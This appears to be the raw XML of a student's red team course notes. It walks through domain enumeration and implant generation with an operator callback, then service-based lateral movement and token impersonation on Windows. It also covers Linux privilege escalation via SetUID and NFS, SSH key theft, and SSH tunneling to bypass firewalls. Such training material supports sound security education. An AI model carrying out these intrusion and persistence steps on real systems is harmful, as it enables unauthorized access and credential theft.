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121f0d" officeooo:paragraph-rsid="001911f8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weight="normal" officeooo:rsid="00142149" officeooo:paragraph-rsid="001911f8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weight="normal" officeooo:rsid="001611aa" officeooo:paragraph-rsid="001611aa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weight="normal" officeooo:rsid="001611aa" officeooo:paragraph-rsid="0016b0f4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weight="normal" officeooo:rsid="0016b0f4" officeooo:paragraph-rsid="0016b0f4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weight="normal" officeooo:rsid="0016b0f4" officeooo:paragraph-rsid="00177cd6" style:font-weight-asian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weight="normal" officeooo:rsid="001911f8" officeooo:paragraph-rsid="001911f8" style:font-weight-asian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1af4fe" officeooo:paragraph-rsid="001af4f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1c1d08" officeooo:paragraph-rsid="001c1d0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1ea33e" officeooo:paragraph-rsid="001ea33e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1fcce6" officeooo:paragraph-rsid="001fcce6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2565b6" officeooo:paragraph-rsid="002565b6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2d6223" officeooo:paragraph-rsid="002d6223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normal" officeooo:rsid="001c1d08" officeooo:paragraph-rsid="001c1d08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normal" officeooo:rsid="002d6223" officeooo:paragraph-rsid="002d6223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1af4fe" officeooo:paragraph-rsid="001af4f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1c1d08" officeooo:paragraph-rsid="001c1d0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1c1d08" officeooo:paragraph-rsid="001da2d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1ea33e" officeooo:paragraph-rsid="001ea33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1fcce6" officeooo:paragraph-rsid="001fcce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2565b6" officeooo:paragraph-rsid="002565b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200%" fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="002d6223" officeooo:paragraph-rsid="002d622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200%" fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="001af4fe" officeooo:paragraph-rsid="001af4f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line-height="200%" fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="001da2d0" officeooo:paragraph-rsid="001c1d08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200%" fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="002565b6" officeooo:paragraph-rsid="002565b6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line-height="200%" fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="002565b6" officeooo:paragraph-rsid="002565b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bold" officeooo:rsid="001af4fe" officeooo:paragraph-rsid="001af4fe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normal" officeooo:rsid="001c1d08" officeooo:paragraph-rsid="001c1d0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line-height="200%" fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="002d6223" officeooo:paragraph-rsid="002d622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line-height="200%" fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="001af4fe" officeooo:paragraph-rsid="001af4fe" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="001611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16b0f4"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="00177cd6"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="001da2d0"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="0026fc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Red Team 1 Recap –</text:span> </text:p>
      <text:p text:style-name="P3">- session on Mwesten</text:p>
      <text:p text:style-name="P3">- sa-whoami, understand who we are</text:p>
      <text:p text:style-name="P3"><text:tab/>-get admin data, what groups we are in</text:p>
      <text:p text:style-name="P3">- ps, see what processes are running and who they are run by</text:p>
      <text:p text:style-name="P3">- sa-ldapsearch ObjectClass=Computer, query the computers on the domain</text:p>
      <text:p text:style-name="P3"><text:tab/>-sa-ldapsearch (&amp;(ObjectClass=Computer)(samaccountname=*dc*))</text:p>
      <text:p text:style-name="P3"><text:tab/>-samaccountname=*dc*, get usernames with dc in them</text:p>
      <text:p text:style-name="P3">- execute -o net <text:span text:style-name="T6">group “Domain Admins” /domain</text:span></text:p>
      <text:p text:style-name="P3"><text:tab/>-getting group <text:span text:style-name="T6">members of the domain admins group</text:span></text:p>
      <text:p text:style-name="P3"><text:tab/>-<text:span text:style-name="T6">can just do net group to get all groups</text:span></text:p>
      <text:p text:style-name="P4">- sa-ldapsearch ObjectClass=Computer, query the computers on the domain</text:p>
      <text:p text:style-name="P4"><text:tab/>-sa-ldapsearch (&amp;(ObjectClass=Computer)(samaccountname=*<text:span text:style-name="T6">gnuchl</text:span>*))</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/>-<text:span text:style-name="T6">gets accounts of gnuhcl who we found is a domain admin</text:span></text:p>
      <text:p text:style-name="P4">- <text:span text:style-name="T6">sa-nslookup gnuhcl &lt;ip_of_DNS server (bottom one)&gt; 1</text:span></text:p>
      <text:p text:style-name="P4">- <text:span text:style-name="T6">ls //&lt;ip&gt;/admin$/system32/t*, get all files in system32 of gnuhcl computer</text:span></text:p>
      <text:p text:style-name="P5">- <text:span text:style-name="T7">generate –http https://&lt;self_ip&gt; -f service</text:span></text:p>
      <text:p text:style-name="P5"><text:tab/>-<text:span text:style-name="T7">saves implant to home directory, can then execute on the target system </text:span></text:p>
      <text:p text:style-name="P6">-<text:span text:style-name="T7">upload our generated service to target with upload &lt;implant_name&gt;</text:span> //&lt;ip&gt;/admin$/system32, </text:p>
      <text:p text:style-name="P6">- <text:span text:style-name="T7">execute -o sc \\\\gnuhcl create eventmon binpath=C:</text:span><text:a xlink:type="simple" xlink:href="file://Windows//System32//" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T7">\\Windows\\System32\\</text:span></text:a><text:span text:style-name="T7">&lt;implant_name_on_target&gt;</text:span></text:p>
      <text:p text:style-name="P6">- <text:s/><text:span text:style-name="T7">execute -o sc \\\\gnuhcl start eventmon</text:span></text:p>
      <text:p text:style-name="P6">- <text:span text:style-name="T7">sa-whoami, verify we are gnuhcl</text:span></text:p>
      <text:p text:style-name="P7">- ps, find users running processes with creds/tokens</text:p>
      <text:p text:style-name="P7">- impersonate gnuhcl, verify w sa-whoami</text:p>
      <text:p text:style-name="P7"><text:soft-page-break/>- sa-ipconfig</text:p>
      <text:p text:style-name="P7">- enumerate for files</text:p>
      <text:p text:style-name="P7">- can move up to DC admin first if cannot find files</text:p>
      <text:p text:style-name="P7">- sa-netshares &lt;DC_IP&gt;</text:p>
      <text:p text:style-name="P7">- ls //&lt;DC_IP&gt;/proce_share/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Red Team 2 Notes</text:p>
      <text:p text:style-name="P2">-<text:span text:style-name="T1">domain admins → server admins → workstation admins → normal users</text:span></text:p>
      <text:p text:style-name="P8">Challenge Problem:</text:p>
      <text:p text:style-name="P16">- regain access to previous network</text:p>
      <text:p text:style-name="P16">- we have current access to network with shared linux access to our target network</text:p>
      <text:p text:style-name="P16">- establish pivots as needed from domain A → domain B</text:p>
      <text:p text:style-name="P16">- get https callback from target domain (domain B)</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P30">Linux:</text:p>
      <text:p text:style-name="P16">- linux environments tend to be more unique, where windows supports large centralized management</text:p>
      <text:p text:style-name="P16">- diff configs computer → computer</text:p>
      <text:p text:style-name="P16">- less implicit trust, also less standardization (easier to make subtle mistakes/exploit)</text:p>
      <text:p text:style-name="P8">Internal Recon:</text:p>
      <text:p text:style-name="P16">- similar process as exploiting Windows, get users and groups, IP/domain info, process list, port enum, acitve logins + login history, OS info (very important in linux), file enum + data mining</text:p>
      <text:p text:style-name="P8">Linux File Structure:</text:p>
      <text:p text:style-name="P16">- /bin = very important binaries to boot system</text:p>
      <text:p text:style-name="P16">- /etc = configurations</text:p>
      <text:p text:style-name="P16">- /home = home directories</text:p>
      <text:p text:style-name="P16">- /root = root home directory</text:p>
      <text:p text:style-name="P8">Files to Look For:</text:p>
      <text:p text:style-name="P16">- no implicit trust/no concept of stealing creds/tokens for high integrity as in Windows</text:p>
      <text:p text:style-name="P16">- look for stored creds in text/config files, SSH keys, application keys/creds</text:p>
      <text:p text:style-name="P16">- look for SSHD, file shares (mounted and served), other interesting service</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P23"><text:soft-page-break/>Lab 1: Enumeration</text:p>
      <text:p text:style-name="P16">- access sliver team server and find callback</text:p>
      <text:p text:style-name="P16">- perform initial enumeration</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P9">Privilege Escalation:</text:p>
      <text:p text:style-name="P17">- varies more than windows</text:p>
      <text:p text:style-name="P17">- look for <text:span text:style-name="T2">sudo</text:span>, setUI binaries, system/service misconfigs</text:p>
      <text:p text:style-name="P17">- sudo is similar to run as admin in windows</text:p>
      <text:p text:style-name="P17"><text:s/><text:tab/>-not linux universal, but on most linux systems</text:p>
      <text:p text:style-name="P17"><text:tab/>-can run things as root</text:p>
      <text:p text:style-name="P17">- look for sudo group</text:p>
      <text:p text:style-name="P17"><text:tab/>-can limit groups, user privileges, commands ability to run as root</text:p>
      <text:p text:style-name="P14">SetUID binaries:</text:p>
      <text:p text:style-name="P17">- permission bits, read/write/execute for files/directories</text:p>
      <text:p text:style-name="P17">- can set special bits, one of which is UID</text:p>
      <text:p text:style-name="P17">- if UID bit is set, file runs as owner of file, not the person running it</text:p>
      <text:p text:style-name="P17"><text:tab/>-if owner is root and UID bit is set, they will run as root and have full permissions</text:p>
      <text:p text:style-name="P17">- leave behind UID binaries as breadcrumbs if you were to lose root</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P9">Misconfigurations:</text:p>
      <text:p text:style-name="P17">- side effect of linux systems being more unique</text:p>
      <text:p text:style-name="P17">- small changes can leave system vulnerable</text:p>
      <text:p text:style-name="P14">- NFS, network file service</text:p>
      <text:p text:style-name="P18"><text:tab/>-<text:span text:style-name="T2">‘no squash root’</text:span>, </text:p>
      <text:p text:style-name="P18">- docker access to non-root/sudo users <text:span text:style-name="T8">as docker runs as root and can do whatever it wants</text:span></text:p>
      <text:p text:style-name="P17"><text:soft-page-break/>-config or exe files that are writable by normal users and run automatically as root</text:p>
      <text:p text:style-name="P17">- can upload any files to NFS share</text:p>
      <text:p text:style-name="P17">- NFS preservers UID bit</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P10">Network Enumeration:</text:p>
      <text:p text:style-name="P19">- no active directory, network looks diff</text:p>
      <text:p text:style-name="P19"><text:tab/><text:span text:style-name="T5">no ldapsearch, etc </text:span></text:p>
      <text:p text:style-name="P19">- passive observe things that already exist</text:p>
      <text:p text:style-name="P19">- rely on other methods to find other machines that exist for us to move to</text:p>
      <text:p text:style-name="P19"><text:tab/>-SSH known host files, mounted network shares, arp cache, ping, dns enum, etc</text:p>
      <text:p text:style-name="P19"><text:tab/>-cat .ssh/known_hosts, can give us authenticated user IPs on network</text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P11">Lateral Movement:</text:p>
      <text:p text:style-name="P20">- once identified IPs and potential systems with the known hosts, we laterally move to continue enumeration</text:p>
      <text:p text:style-name="P20">- use and abuse trust within system</text:p>
      <text:p text:style-name="P20">- a lot less implicit trust than on windows, have to go find where trust exists</text:p>
      <text:p text:style-name="P20"><text:tab/>-SSH keys, specifically private keys</text:p>
      <text:p text:style-name="P20">- enumerate known hosts, get keys, ssh as them, heightened trust</text:p>
      <text:p text:style-name="P20">- NFS/Shares/SAMBA(SMB)</text:p>
      <text:p text:style-name="P20"><text:tab/>-network file resources used for system trust</text:p>
      <text:p text:style-name="P20"><text:tab/>-can use file shares w SSH keys or binaries to gain access to other systems that use same file share</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P25"><text:soft-page-break/>Linux as a Network Pivot:</text:p>
      <text:p text:style-name="P21">- linux servers can serve as a flexible entry point into a network</text:p>
      <text:p text:style-name="P21">- often used as tools and hosts, very useful for pivots</text:p>
      <text:p text:style-name="P26">- <text:span text:style-name="T3">How to do it?</text:span></text:p>
      <text:p text:style-name="P21"><text:span text:style-name="T3">-</text:span> SSH tunnels – ssh has this functionality built it, allows user to smuggle traffic through existing session</text:p>
      <text:p text:style-name="P21"><text:tab/>-can be stealthy, efficient, don’t leave binaries or configs around </text:p>
      <text:p text:style-name="P21">- can bypass network security, firewalls, boundary monitoring, etc</text:p>
      <text:p text:style-name="P21">- most common case is getting around broken networking architecture</text:p>
      <text:p text:style-name="P12">Three Types of SSH tunnels:</text:p>
      <text:p text:style-name="P21">- local forward – sending traffic from local machine out SSH server, through tunnel</text:p>
      <text:p text:style-name="P21"><text:tab/>-ssh -L &lt;local_port&gt;&lt;dest_addr&gt;&lt;dest port&gt;&lt;ssh target&gt;</text:p>
      <text:p text:style-name="P21"><text:tab/>-any traffic through local port gets sent to target</text:p>
      <text:p text:style-name="P21"><text:tab/>-no network traffic from local to target server</text:p>
      <text:p text:style-name="P21">- remote forward – used to start listening port on target, sends traffic from client through tunnel</text:p>
      <text:p text:style-name="P21"><text:tab/>-listen on remote server, any traffic going to server port gets pulled back through tunnel into the local system</text:p>
      <text:p text:style-name="P21"><text:tab/>-ssh -R &lt;remote_port&gt;&lt;dest_IP&gt;&lt;dest_port&gt;&lt;ssh target&gt;</text:p>
      <text:p text:style-name="P21"><text:tab/></text:p>
      <text:p text:style-name="P21">- <text:span text:style-name="T9">dynamic forward – send traffic through proxy on local machine through tunnel to destinations through shh server</text:span></text:p>
      <text:p text:style-name="P21"><text:tab/>-<text:span text:style-name="T9">socks/HTTP proxy through SSH.</text:span></text:p>
      <text:p text:style-name="P21"><text:tab/>-<text:span text:style-name="T9">config tool (web browser), anything coming out of tool will go through SSH tunnel</text:span></text:p>
      <text:p text:style-name="P21"><text:tab/>-<text:span text:style-name="T9">don’t have to specify what you want to connect to w SSH, it will dynamically figure it out</text:span></text:p>
      <text:p text:style-name="P21"><text:tab/>-<text:span text:style-name="T9">ssh -D &lt;local_listening_port&gt;</text:span></text:p>
      <text:p text:style-name="P13"><text:soft-page-break/>Cross Platform Lateral Movement</text:p>
      <text:p text:style-name="P15">Windows → Linux:</text:p>
      <text:p text:style-name="P22">- laterally move to linux a lot with Windows</text:p>
      <text:p text:style-name="P22">- plain text creds, password re use</text:p>
      <text:p text:style-name="P22">- find ssh keys</text:p>
      <text:p text:style-name="P22">- find misconfigured apps, can run shells</text:p>
      <text:p text:style-name="P15">Linux → Windows:</text:p>
      <text:p text:style-name="P22">- not as common, more particular</text:p>
      <text:p text:style-name="P22">- using ssh tunnels, can ssh tunnel with rdp</text:p>
      <text:p text:style-name="P22">- trick windows box into thinking your linux box is windows, can use ssh tunneling tricks</text:p>
      <text:p text:style-name="P22">- </text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P7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2:59:17.869765405</meta:creation-date>
    <meta:generator>LibreOffice/7.3.7.2$Linux_X86_64 LibreOffice_project/30$Build-2</meta:generator>
    <dc:date>2023-07-26T13:00:41.985842269</dc:date>
    <meta:editing-duration>PT23M7S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="7" meta:paragraph-count="127" meta:word-count="1034" meta:character-count="6297" meta:non-whitespace-character-count="5342"/>
  </office:meta>
</office:document-meta>
</file>